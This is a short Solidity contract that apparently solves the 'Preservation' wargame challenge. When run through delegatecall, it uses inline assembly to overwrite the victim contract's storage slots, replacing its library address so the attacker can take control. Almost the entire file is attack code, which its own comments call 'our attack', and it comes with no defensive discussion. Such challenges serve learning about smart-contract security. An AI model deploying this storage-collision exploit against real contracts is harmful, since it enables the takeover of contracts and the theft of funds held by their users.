pragma solidity ^0.8.0;

contract OverwriteLibrary {

    // When called via delegatecall, this will overwrite the timeZone2Library (slot 1) in Preservation contract

    function setTime(uint256 _time) public {
        assembly {
            // timeZone2Library is at slot 1 of Preservation
            sstore(1, _time);
            // Also overwrite storedTime (to avoid contract from blowing up in library logic (not needed for our attack)
            sstore(3, 31337)
        }
    }
}

